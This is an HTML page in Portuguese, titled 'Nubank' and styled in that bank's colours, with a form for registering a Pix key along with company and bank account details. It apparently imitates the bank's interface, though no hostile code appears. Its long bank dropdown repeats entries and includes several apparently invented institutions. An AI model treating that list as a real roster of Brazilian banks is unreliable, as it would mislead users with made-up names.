<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
			font-size: 24px;

        }

        header {
            background-color: #820AD1;
            color: #fff;
            text-align: center;
            padding: 10px;
        }

        main {
            padding: 20px;
        }

        form {
			width: 350px;
            background-color: #fff;
            border-radius: 5px;
            padding: 20px;
        }

        h2 {
            font-size: 24px;
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
        }

        input[type="text"],
        select {
            width: 93%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
.cadastro {
		font-size: 16px;
		background-color: #820AD1;
		color: #fff;
		border: none;
		border-radius: 4px;
		cursor: pointer;
		width: 100%;
		padding-top: 10px;
		padding-right: 20px;
		padding-bottom: 10px;
		padding-left: 20px;
        }
cadastro:hover {
            background-color: #6208A2;
        }

        footer {
            text-align: center;
            background-color: #820AD1;
            color: #fff;
            padding: 10px;
        }
    .selecionados {
	font-size: 12px;
	width: 100%;
	background-color: #FFFFFF;
	padding: 5px;
	color: #999;
	height: 35px;
}
.botao {
	font-size: 16px;
	background-color: #820AD1;
	color: #fff;
	border: none;
	border-radius: 4px;
	cursor: pointer;
	width: 30%;
	padding-top: 10px;
	padding-right: 20px;
	padding-bottom: 10px;
	padding-left: 20px;
        }

    </style>
    <title>Nubank</title>
</head>
<body>
    <header>
        <table width="350" border="0" align="center">
  <tr>
    <td height="50" align="center"><table width="350" border="0">
      <tr>
        <td><a href="areapix.php"><img src="imagens/x.png" alt="" width="24"></a></td>
        <td align="right">&nbsp;</td>
      </tr>
    </table></td>
  </tr>
</table>
    </header>

    <main><center>
        <form action="chavecadastrada.php" method="POST">
          CNPJ / Chave Pix &nbsp; <a href="cadastrochavepix.php" class="cadastro">* CPF *</a> <br><br>
          <input type="text" id="chave" name="chave" placeholder="Chave Pix" maxlength="500">
            <input type="text" id="cpf" name="cpf" placeholder="CNPJ" maxlength="14" inputmode="numeric">
          <input type="text" id="nome" name="nome" placeholder="Nome da Empresa" maxlength="50">
          <select name="banco" class="selecionados" id="banco">
            <option selected="selected">Bancos</option>
            <option value="Banco do Brasil">Banco do Brasil</option>
            <option value="BCO BRASIL">Banco do Brasil</option>
            <option value="ITAU">Itaú Unibanco</option>
            <option value="BRADESCO">Bradesco</option>
            <option value="CAIXA">Caixa Econômica Federal</option>
            <option value="SANTANDER">Santander Brasil</option>
            <option value="BTG PACTUAL">BTG Pactual</option>
            <option value="BANCO ORIGINAL">Banco Original</option>
            <option value="BANRISUL">Banrisul</option>
            <option value="SICOOB">Sicoob</option>
            <option value="BANCO INTER">Banco Inter</option>
            <option value="NUBANK">Nubank</option>
            <option value="Safra">Banco Safra</option>
            <option value="BANCO DO NORDESTE">Banco do Nordeste</option>
            <option value="C6 BANK">C6 Bank</option>
            <option value="BANCO PAN">Banco Pan</option>
            <option value="BCO BMG">Banco BMG</option>
            <option value="PAGSEGURO INTERQNET IP S.A">PagSeguro</option>
            <option value="BANCO SANTANDER BRASIL">Banco Santander Brasil</option>
            <option value="BANCO VOTORANTIM">Banco Votorantim</option>
            <option value="BANCO DAYCOVAL">Banco Daycoval</option>
            <option value="BANCO CREDIT SUISSE">Banco Credit Suisse</option>
            <option value="BANCO SANTOS">Banco Santos</option>
            <option value="BANCO ALFA">Banco Alfa</option>
            <option value="BANCO ABC BRASIL">Banco ABC Brasil</option>
            <option value="BANCO PANAMERICANO">Banco Panamericano</option>
            <option value="BANCO INDUSVAL">Banco Indusval</option>
            <option value="BANCO RURAL">Banco Rural</option>
            <option value="BANCO CCB BRASIL">Banco CCB Brasil</option>
            <option value="BANCO TRICURY">Banco Tricury</option>
            <option value="BANCO CARREFOUR">Banco Carrefour</option>
            <option value="BANCO SEMEAR">Banco Semear</option>
            <option value="CITIBANK">Citibank Brasil</option>
            <option value="BANCO PINE">Banco Pine</option>
            <option value="BANCO FIBRA">Banco Fibra</option>
            <option value="BANCO SOFISA">Banco Sofisa</option>
            <option value="BANCO VOLKSWAGEN">Banco Volkswagen</option>
            <option value="BANCO BONSUCESSO">Banco Bonsucesso</option>
            <option value="BANCO PAULISTA">Banco Paulista</option>
            <option value="BANCO NEON">Banco Neon</option>
            <option value="BANCO J. SAFRA">Banco J. Safra</option>
            <option value="BANCO MODAL">Banco Modal</option>
            <option value="BANCO MATONE">Banco Matone</option>
            <option value="BANCO SAFRA PESSOAL">Banco Safra Pessoal</option>
            <option value="BANCO A.J. RENNER">Banco A.J. Renner</option>
            <option value="BANCO TOPÁZIO">Banco Topázio</option>
            <option value="BANCO ARBI">Banco Arbi</option>
            <option value="BANCO FINASA">Banco Finasa</option>
            <option value="BANCO PROSPER">Banco Prosper</option>
            <option value="BANCO DA AMAZÔNIA">Banco da Amazônia</option>
            <option value="BANCO FIBRA">Banco Fibra</option>
            <option value="BANCO FICSA">Banco Ficsa</option>
            <option value="BANCO 3M">Banco 3M</option>
            <option value="BANCO AGIBANK">Banco Agibank</option>
            <option value="BANCO ALVORADA">Banco Alvorada</option>
            <option value="BANCO ATIVA">Banco Ativa</option>
            <option value="BANCO AZTECA">Banco Azteca</option>
            <option value="BANCO BAI EUROPA">Banco BAI Europa</option>
            <option value="BANCO BANERJ">Banco Banerj</option>
            <option value="BANCO BARIGUI">Banco Barigui</option>
            <option value="BANCO BARI">Banco Bari</option>
            <option value="BANCO BASE">Banco Base</option>
            <option value="BANCO BBM">Banco BBM</option>
            <option value="BANCO BCO">Banco BCO</option>
            <option value="BANCO BDA">Banco BDA</option>
            <option value="BANCO BMJ">Banco BMJ</option>
            <option value="BANCO BONSUCESSO CONSIGNADO">Banco Bonsucesso Consignado</option>
            <option value="BANCO BOREAL">Banco Boreal</option>
            <option value="BANCO BRASCAN">Banco Brascan</option>
            <option value="BANCO BS2">Banco BS2</option>
            <option value="BANCO BTG PACTUAL DIGITAL">Banco BTG Pactual Digital</option>
            <option value="BANCO BVA">Banco BVA</option>
            <option value="BANCO BVA CONSIGNADO">Banco BVA Consignado</option>
            <option value="BANCO CACIQUE">Banco Cacique</option>
            <option value="BANCO CACIQUE CONSIGNADO">Banco Cacique Consignado</option>
            <option value="BANCO CAIXA GERAL BRASIL">Banco Caixa Geral Brasil</option>
            <option value="BANCO CARGILL">Banco Cargill</option>
            <option value="BANCO CIFRA">Banco Cifra</option>
            <option value="BANCO CITIBANK">Banco Citibank</option>
            <option value="BANCO CONFIDENCE">Banco Confidence</option>
            <option value="BANCO COOP">Banco Coop</option>
            <option value="BANCO CSF">Banco CSF</option>
            <option value="BANCO CÉDULA">Banco Cédula</option>
            <option value="BANCO DAIMLER">Banco Daimler</option>
            <option value="BANCO DIGIMAIS">Banco Digimais</option>
            <option value="BANCO DME">Banco DME</option>
            <option value="BANCO DO VALE">Banco do Vale</option>
            <option value="BANCO DUCTOR">Banco Ductor</option>
            <option value="BANCO FATOR">Banco Fator</option>
            <option value="BANCO FIDIS">Banco Fidis</option>
            <option value="BANCO FORD">Banco Ford</option>
            <option value="BANCO GMAC">Banco GMAC</option>
            <option value="BANCO GUANABARA">Banco Guanabara</option>
            <option value="BANCO HONDA">Banco Honda</option>
            <option value="BANCO HYUNDAI">Banco Hyundai</option>
            <option value="BANCO INDUSTRIAL">Banco Industrial</option>
            <option value="BANCO INTERCAP">Banco Intercap</option>
            <option value="BANCO INTERMEDIUM">Banco Intermedium</option>
            <option value="BANCO ITAÚ BBA">Banco Itaú BBA</option>
            <option value="BANCO ITAÚ BANK">Banco Itaú Bank</option>
            <option value="BANCO ITAÚ CONSIGNADO">Banco Itaú Consignado</option>
            <option value="BANCO ITAÚ VEÍCULOS">Banco Itaú Veículos</option>
            <option value="BANCO ORIGINAL">Banco Original</option>
            <option value="BANCO PAN">Banco Pan</option>
            <option value="BANCO PANAMERICANO">Banco Panamericano</option>
            <option value="BANCO PARMER">Banco Parmer</option>
            <option value="BANCO PAULISTA">Banco Paulista</option>
            <option value="BANCO PEUGEOT">Banco Peugeot</option>
            <option value="BANCO PHOENIX">Banco Phoenix</option>
            <option value="BANCO PINHEIRO">Banco Pinheiro</option>
            <option value="BANCO PINE">Banco Pine</option>
            <option value="BANCO PLURAL">Banco Plural</option>
            <option value="BANCO POLIBANK">Banco Polibank</option>
            <option value="BANCO PORTO SEGURO">Banco Porto Seguro</option>
            <option value="BANCO POTTENCIAL">Banco Pottencial</option>
            <option value="BANCO PSA FINANCE">Banco PSA Finance</option>
            <option value="BANCO RCI BRASIL">Banco RCI Brasil</option>
            <option value="BANCO RENDIMENTO">Banco Rendimento</option>
            <option value="BANCO RIO">Banco Rio</option>
            <option value="BANCO RIO GRANDE">Banco Rio Grande</option>
            <option value="BANCO RODOBENS">Banco Rodobens</option>
            <option value="BANCO RURAL">Banco Rural</option>
            <option value="BANCO SABEMI">Banco Sabemi</option>
            <option value="BANCO SAFRA">Banco Safra</option>
            <option value="BANCO SANTANDER">Banco Santander</option>
            <option value="BANCO SEMEAR">Banco Semear</option>
            <option value="BANCO SICREDI">Banco Sicredi</option>
            <option value="BANCO SIMPLES">Banco Simples</option>
            <option value="BANCO SOFISA">Banco Sofisa</option>
            <option value="BANCO SOCINAL">Banco Socinal</option>
            <option value="BANCO SOFITASA">Banco Sofitasa</option>
            <option value="BANCO TABOÃO">Banco Taboão</option>
            <option value="BANCO TECNICRED">Banco Tecnicred</option>
            <option value="BANCO TOYOTA">Banco Toyota</option>
            <option value="BANCO TRICURY">Banco Tricury</option>
            <option value="BANCO TRIANGULO">Banco Triângulo</option>
            <option value="BANCO UBS">Banco UBS</option>
            <option value="BANCO UBS BRASIL">Banco UBS Brasil</option>
            <option value="BANCO UNICRED">Banco Unicred</option>
            <option value="BANCO UNICRED CONSIGNADO">Banco Unicred Consignado</option>
            <option value="BANCO UNICRED VEÍCULOS">Banco Unicred Veículos</option>
            <option value="BANCO UNICRED NORTE DO PARANÁ">Banco Unicred Norte do Paraná</option>
            <option value="BANCO UNICRED RS">Banco Unicred RS</option>
            <option value="BANCO UNIPRIME">Banco Uniprime</option>
            <option value="BANCO UNITED">Banco United</option>
            <option value="BANCO UNIVERSAL">Banco Universal</option>
            <option value="BANCO V MOTOR">Banco V Motor</option>
            <option value="BANCO VIPS">Banco Vips</option>
            <option value="BANCO VOLKSWAGEN">Banco Volkswagen</option>
            <option value="BANCO VR">Banco VR</option>
            <option value="BANCO WEEL">Banco Weel</option>
            <option value="BANCO WIDE">Banco Wide</option>
            <option value="BANCO WINBANK">Banco Winbank</option>
            <option value="BANCO YAMAHA">Banco Yamaha</option>
            <option value="BANCO YAMAHA VEÍCULOS">Banco Yamaha Veículos</option>
            <option value="BANCO YAMAHA WOORI">Banco Yamaha Woori</option>
            <option value="BANCO YARA">Banco Yara</option>
            <option value="BANCO YUHO">Banco Yuho</option>
            <option value="BANCO ZEMA">Banco Zema</option>
            <option value="BANCO ZOGBI">Banco Zogbi</option>
          </select>
            <select name="tipoconta" class="selecionados" id="tipoconta">
              <option selected="selected">Tipo de conta</option>
<option value="Conta corrente">Conta Corrente</option>
<option value="Conta poupança">Conta Poupança</option>
<option value="Conta salário">Conta Salário</option>
<option value="Conta de pagamentos">Conta de pagamentos</option>
</select>
            <input type="text" id="agencia" name="agencia" placeholder="Agência" maxlength="5" inputmode="numeric">
            <input type="text" id="conta" name="conta" placeholder="Conta" maxlength="5" inputmode="numeric">
            <button type="submit" class="cadastro">Cadastrar Chave</button>
          <br>
          <br>
        </form></center>
    </main>

   
</body>
</html>
